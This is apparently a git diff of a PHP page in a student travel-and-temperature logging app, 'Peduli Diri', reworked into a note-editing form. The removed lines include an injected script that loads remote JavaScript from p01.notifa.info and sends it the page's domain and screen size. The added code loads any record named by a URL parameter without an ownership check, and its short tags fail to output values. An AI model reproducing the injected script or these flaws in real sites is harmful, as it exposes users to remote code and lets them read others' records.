@@ -11,23 +11,16 @@ if(empty( $_SESSION['nik'])){ ?>
 <html lang="en">
 
 <head>
-    <title>Peduli Diri - Dashboard</title>
+    <title>Peduli Diri - Tulis Catatan</title>
     <link rel="icon" href="assets/images/logoicon.png" type="image/x-icon">
-    <!-- simplebar CSS-->
-    <link href="assets/plugins/simplebar/css/simplebar.css" rel="stylesheet"/>
-    <!-- Bootstrap core CSS-->
-    <link href="assets/css/bootstrap.min.css" rel="stylesheet"/>
-    <!--Data Tables -->
-    <link href="assets/plugins/bootstrap-datatable/css/dataTables.bootstrap4.min.css" rel="stylesheet" type="text/css">
-    <link href="assets/plugins/bootstrap-datatable/css/buttons.bootstrap4.min.css" rel="stylesheet" type="text/css">
-    <!-- animate CSS-->
-    <link href="assets/css/animate.css" rel="stylesheet" type="text/css"/>
-    <!-- Icons CSS-->
-    <link href="assets/css/icons.css" rel="stylesheet" type="text/css"/>
-    <!-- Sidebar CSS-->
-    <link href="assets/css/sidebar-menu.css" rel="stylesheet"/>
-    <!-- Custom Style-->
-    <link href="assets/css/app-style.css" rel="stylesheet"/>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta http-equiv="Content-Language" content="en">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, shrink-to-fit=no" />
+    <meta name="description" content="Highly configurable boxes best used for showing numbers in an user friendly way.">
+    <meta name="msapplication-tap-highlight" content="no">
+
 
 <link href="main.css" rel="stylesheet"></head>
 <body>
@@ -54,8 +47,7 @@ if(empty( $_SESSION['nik'])){ ?>
                     </button>
                 </div>
             </div>           
-        </div>    
-            <!-- fitur warna -->
+        </div>        
         <div class="ui-theme-settings">
             <button type="button" id="TooltipDemo" class="btn-open-options btn btn-warning">
                 <i class="fa fa-cog fa-w-16 fa-spin fa-2x"></i>
@@ -249,245 +241,166 @@ if(empty( $_SESSION['nik'])){ ?>
                 </div>
             </div>
         </div>        
-            <!-- end fitur warna -->
-        <div class="app-main">
-                <div class="app-sidebar sidebar-shadow">
-                    <div class="app-header__logo">
-                        <div class="logo-src"></div>
-                        <div class="header__pane ml-auto">
+            <div class="app-main">
+                    <div class="app-sidebar sidebar-shadow">
+                        <div class="app-header__logo">
+                            <div class="logo-src"></div>
+                            <div class="header__pane ml-auto">
+                                <div>
+                                    <button type="button" class="hamburger close-sidebar-btn hamburger--elastic" data-class="closed-sidebar">
+                                        <span class="hamburger-box">
+                                            <span class="hamburger-inner"></span>
+                                        </span>
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="app-header__mobile-menu">
                             <div>
-                                <button type="button" class="hamburger close-sidebar-btn hamburger--elastic" data-class="closed-sidebar">
+                                <button type="button" class="hamburger hamburger--elastic mobile-toggle-nav">
                                     <span class="hamburger-box">
                                         <span class="hamburger-inner"></span>
                                     </span>
                                 </button>
                             </div>
                         </div>
-                    </div>
-                    <div class="app-header__mobile-menu">
-                        <div>
-                            <button type="button" class="hamburger hamburger--elastic mobile-toggle-nav">
-                                <span class="hamburger-box">
-                                    <span class="hamburger-inner"></span>
-                                </span>
-                            </button>
+                        <div class="app-header__menu">
+                            <span>
+                                <button type="button" class="btn-icon btn-icon-only btn btn-primary btn-sm mobile-toggle-header-nav">
+                                    <span class="btn-icon-wrapper">
+                                        <i class="fa fa-ellipsis-v fa-w-6"></i>
+                                    </span>
+                                </button>
+                            </span>
+                        </div>    
+                        <div class="scrollbar-sidebar">
+                            <div class="app-sidebar__inner">
+                                <ul class="vertical-nav-menu">
+                                    <li class="app-sidebar__heading">Menu</li>
+                                    <li>
+                                        <a href="user.php" >
+                                            <i class="metismenu-icon pe-7s-monitor"></i>
+                                            Dashboard
+                                        </a>
+                                    </li>
+                                    <li>
+                                        <a href="tulis_catatan.php" >
+                                            <i class="metismenu-icon pe-7s-pen"></i>
+                                            Tulis Catatan
+                                        </a>
+                                    </li>
+                                    <li>
+                                        <a href="catatan_perjalanan.php" >
+                                            <i class="metismenu-icon pe-7s-folder"></i>
+                                            Edit Perjalanan
+                                        </a>
+                                    </li>
+                                    <li>
+                                        <a href="logout.php" >
+                                            <i class="metismenu-icon pe-7s-next-2"></i>
+                                            Logout
+                                        </a>
+                                    </li>
+                                </ul>
+                            </div>
                         </div>
-                    </div>
-                    <div class="app-header__menu">
-                        <span>
-                            <button type="button" class="btn-icon btn-icon-only btn btn-primary btn-sm mobile-toggle-header-nav">
-                                <span class="btn-icon-wrapper">
-                                    <i class="fa fa-ellipsis-v fa-w-6"></i>
-                                </span>
-                            </button>
-                        </span>
                     </div>    
-                    <!-- sidebar -->
-                    <div class="scrollbar-sidebar">
-                        <div class="app-sidebar__inner">
-                            <ul class="vertical-nav-menu">
-                                <li class="app-sidebar__heading">Menu</li>
-                                <li>
-                                    <a href="user.php" >
-                                        <i class="metismenu-icon pe-7s-monitor"></i>
-                                        Dashboard
-                                    </a>
-                                </li>
-                                <li>
-                                    <a href="?url=tulis_catatan" >
-                                        <i class="metismenu-icon pe-7s-pen"></i>
-                                        Tulis Catatan
-                                    </a>
-                                </li>
-                                <li>
-                                    <a href="?url=catatan_perjalanan" >
-                                        <i class="metismenu-icon pe-7s-folder"></i>
-                                        Edit Perjalanan
-                                    </a>
-                                </li>
-                                <li>
-                                    <a href="logout.php" >
-                                        <i class="metismenu-icon pe-7s-next-2"></i>
-                                        Logout
-                                    </a>
-                                </li>
-                            </ul>
-                        </div>
-                    </div>
-                    <!-- end sidebar -->
-                </div>    
-                <!-- code biar jadi main template -->
-                <?php 
-                if(!empty(@$_GET['url'])){
-                    switch (@$_GET['url']){
-                        case 'tulis_catatan';
-                            include 'tulis_catatan.php';
-                            break;
-
-                        case 'catatan_perjalanan';
-                            include 'catatan_perjalanan.php';
-                            break;
-
-                        default:
-                            echo "<h3> Halaman tidak ditemukan </h3>";
-                            break;
-                    }
-                }else{ ?>
-                <!-- isi dashboard -->
                     <div class="app-main__outer">
                     <div class="app-main__inner">
                         <div class="app-page-title">
                             <div class="page-title-wrapper">
                                 <div class="page-title-heading">
                                     <div class="page-title-icon">
-                                        <a href="user.php">
-                                            <i class="pe-7s-notebook"></i>
-                                        </a>
+                                        <i class="pe-7s-graph text-success">
+                                        </i>
                                     </div>
-                                    <div><a href=""> Peduli Diri </a>
-                                        <div class="page-title-subheading">
-                                        <?php 
-                                        echo "Selamat Datang ".$_SESSION['nama_lengkap']. " Di Aplikasi Peduli Diri"; 
-                                        ?>
-                                        </div>
+                                    <div>Edit Catatan
                                     </div>
-                                </div>  
+                                </div>
+                                
                             </div>
                         </div>            
-                        <div class="container">
-                            <div class="row">
-                                <div class="col-lg-6 col-xl-6">
-                                    <div class="card mb-3 widget-content">
-                                        <div class="widget-content-wrapper">
-                                            <div class="widget-content-left">
-                                                <div class="widget-heading">
-                                                    <a href="tulis_catatan.php"> Tulis Catatan</a>
+                
+                        <div class="tab-content-0">
+                            <div class="tab-pane tabs-animation fade show active"role="tabpanel">
+                                <div class="main-card mb-3 card">
+                                    <div class="card-body"><h5 class="card-title">Edit Catatan Perjalanan</h5>
+                                    <?php 
+                                        $data = file('catatan.txt', FILE_IGNORE_NEW_LINES);
+                                        $id_catatan = $_GET['id_catatan'];
+                                        foreach($data as $value){
+                                            $pecah = explode('|', $value);
+                                            if ($pecah['0']==$id_catatan){
+                                    ?>
+                                        <form class="" action="simpan_edit_catatan.php" method="POST">
+                                            <input type="hidden" name="id_catatan" value="<? $pecah['0']; ?>">
+                                            <div class="position-relative row form-group"><label for="exampleEmail" class="col-sm-2 col-form-label">Tanggal</label>
+                                                <div class="col-sm-10"><input value="<? $pecah['3']; ?>" name="tanggal" id="exampleEmail" placeholder="Tanggal" type="date" min="2022-1-1" class="form-control"></div>
+                                            </div>
+                                            <div class="position-relative row form-group"><label for="examplePassword" class="col-sm-2 col-form-label">Jam</label>
+                                                <div class="col-sm-10"><input value="<? $pecah['4']; ?>" name="jam" id="examplePassword" placeholder="Jam" type="time" class="form-control"></div>
+                                            </div>
+                                            <div class="position-relative row form-group"><label for="examplePassword" class="col-sm-2 col-form-label">Lokasi yang dituju</label>
+                                                <div class="col-sm-10"><input value="<? $pecah['5']; ?>" name="lokasi" id="examplePassword" placeholder="Masukan Lokasi" type="text" class="form-control"></div>
+                                            </div>
+                                            <div class="position-relative row form-group"><label for="examplePassword" class="col-sm-2 col-form-label">Suhu tubuh</label>
+                                                <div class="col-sm-10"><input value="<? $pecah['6']; ?>" name="suhu" id="examplePassword" placeholder="Masukan Suhu Tubuh" type="text" class="form-control"></div>
+                                            </div>
+                                            <div class="position-relative row form-check">
+                                                <div class="col-sm-10 offset-sm-2">
+                                                    <button class="btn btn-secondary" type="submit">Simpan</button>
+                                                    <button class="btn btn-secondary" type="reset">Kosongkan</button>
                                                 </div>
                                             </div>
-                                        </div>
-                                    </div>
-                                </div>
-                                <div class="col-lg-6 col-xl-6">
-                                    <div class="card mb-3 widget-content">
-                                        <div class="widget-content-wrapper">
-                                            <div class="widget-content-left">
-                                                <div class="widget-heading">
-                                                    <a href="catatan_perjalanan.php"> Catatan Perjalanan</a>
-                                                </div>
-                                            </div>
-                                        </div>
+                                        </form>
+                                        <?php }} ?>
                                     </div>
                                 </div>
                             </div>
                         </div>
-                        <div class="row">
-                            <div class="col-lg-12">
-                                <div class="card">
-                                    <div class="card-header"><i class="fa fa-table"></i>Riwayat Perjalanan</div>
-                                        <div class="card-body">
-                                            <div class="table-responsive">
-                                                <table id="example" class="table table-bordered">
-                                                    <thead>
-                                                        <tr>
-                                                            <th>Tanggal</th>
-                                                            <th>Waktu</th>
-                                                            <th>Lokasi</th>
-                                                            <th>Suhu Tubuh</th>
-                                                        </tr>
-                                                    </thead>
-                                                    <tbody>
-                                                        <?php
-                                                        $data = file('catatan.txt',FILE_IGNORE_NEW_LINES);
-                                                        $user = $_SESSION['nik']."|".$_SESSION['nama_lengkap'];
-                                                    foreach($data as $value){
-                                                        $a =explode("|",$value);
-                                                        @$b =$a['1']."|".$a['2'];
-                                                        if($b==$user){
-
-                                                        ?>
-                                                        <tr>
-                                                            <td><?= $a['3'];?></td>
-                                                            <td><?= $a['4'];?></td>
-                                                            <td><?= $a['5'];?></td>
-                                                            <td><?= $a['6'];?></td>
-                                                        </tr>
-                                                        <?php }} ?>
-                                                    </tbody>  
-                                                </table>
-                                            </div>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>  
-                        </div>
-                    </div>   
-                </div>
-             <?php   } ?>
-            </div>
-            <div class="app-wrapper-footer">
-                <div class="app-footer">
-                    <div class="app-footer__inner">
-                        <div class="app-footer-right">
-                            <ul class="nav">
-                                <li class="nav-item">
-                                    <a href="javascript:void(0);" class="nav-link">
-                                        &copy; Mohammad Reihan Zakya Alawi
-                                    </a>
-                                </li>
-                            </ul>
-                        </div>
                     </div>
+                    <div class="app-wrapper-footer">
+                        <div class="app-footer">
+                            <div class="app-footer__inner">
+                                <div class="app-footer-left">
+                                    <ul class="nav">
+                                        <li class="nav-item">
+                                            <a href="javascript:void(0);" class="nav-link">
+                                                Footer Link 1
+                                            </a>
+                                        </li>
+                                        <li class="nav-item">
+                                            <a href="javascript:void(0);" class="nav-link">
+                                                Footer Link 2
+                                            </a>
+                                        </li>
+                                    </ul>
+                                </div>
+                                <div class="app-footer-right">
+                                    <ul class="nav">
+                                        <li class="nav-item">
+                                            <a href="javascript:void(0);" class="nav-link">
+                                                Footer Link 3
+                                            </a>
+                                        </li>
+                                        <li class="nav-item">
+                                            <a href="javascript:void(0);" class="nav-link">
+                                                <div class="badge badge-success mr-1 ml-0">
+                                                    <small>NEW</small>
+                                                </div>
+                                                Footer Link 4
+                                            </a>
+                                        </li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                    </div>    
                 </div>
-            </div>  
-            
-    <!-- Architech -->
+            </div>
+        </div>
+    </div>
     <script type="text/javascript" src="assets/scripts/main.js"></script>
 
-    <!-- Bootstrap core JavaScript-->
-    <script src="assets/js/jquery.min.js"></script>
-    <script src="assets/js/popper.min.js"></script>
-    <script src="assets/js/bootstrap.min.js"></script>
-
-    <!-- simplebar js -->
-    <script src="assets/plugins/simplebar/js/simplebar.js"></script>
-    <!-- waves effect js -->
-    <script src="assets/js/waves.js"></script>
-    <!-- sidebar-menu js -->
-    <script src="assets/js/sidebar-menu.js"></script>
-    <!-- Custom scripts -->
-    <script src="assets/js/app-script.js"></script>
-
-    <!--Data Tables js-->
-    <script src="assets/plugins/bootstrap-datatable/js/jquery.dataTables.min.js"></script>
-    <script src="assets/plugins/bootstrap-datatable/js/dataTables.bootstrap4.min.js"></script>
-    <script src="assets/plugins/bootstrap-datatable/js/dataTables.buttons.min.js"></script>
-    <script src="assets/plugins/bootstrap-datatable/js/buttons.bootstrap4.min.js"></script>
-    <script src="assets/plugins/bootstrap-datatable/js/jszip.min.js"></script>
-    <script src="assets/plugins/bootstrap-datatable/js/pdfmake.min.js"></script>
-    <script src="assets/plugins/bootstrap-datatable/js/vfs_fonts.js"></script>
-    <script src="assets/plugins/bootstrap-datatable/js/buttons.html5.min.js"></script>
-    <script src="assets/plugins/bootstrap-datatable/js/buttons.print.min.js"></script>
-    <script src="assets/plugins/bootstrap-datatable/js/buttons.colVis.min.js"></script>
-
-    <script>
-        $(document).ready(function() {
-        //Default data table
-        $('#default-datatable').DataTable();
-
-
-        var table = $('#example').DataTable( {
-            lengthChange: false,
-            buttons: [ 'copy', 'excel', 'pdf', 'print' ]
-        } );
-
-        table.buttons().container()
-            .appendTo( '#example_wrapper .col-md-6:eq(0)' );
-        
-        } );
-
-    </script>
-
-    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAz4dcBbGgKuih2FzmamiVXBdP7rQdzhTxfpkFFtvOnyejVCSSPK6u9WcsNj8GrchwkcC0cuuN23MjWecopK9D18LKoyDfbiXPfrndpWGpPOH2fLRyh5tK5%2f2c9K0us8J%2bjf3vFsn4%2fTXFgzL766s1rvusNt%2f2awK9lOy4Vktosm3AYYGGLl5M3uaPFy1scuCQj%2f0TtP9KTGu%2baG8AY8xIwvJwZqBstW8mLUHXgBTl%2fCiejm4tW3R%2b8lXa%2bjlGl2mi3qy6h0ZR8W72goA0fM%2fheFCPwMRwWv3%2fgBJNpUwJ%2bH2t1mVHjs4ZpZ7goJxWRAK4PpOPCLgzKtOnJI%2fZInHhRwD94P7HZXLqHaKn2Dp3%2fdEJHkeaL4yuoeuu063ZBMPA0nAsB4sgvkCfWzi2EjFHA1gg77pOXVlnhhOP8kHZYxMQ4QoZOkHsqic6nVTUksRjQ3Mma4U0zDcidDMWZgPrAvo08lzOZJkkwlaTsMfMhGiEbCHIzyrFruRxowfltKRNMntpE19Ejg4%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
-
-
+</body>
 </html>
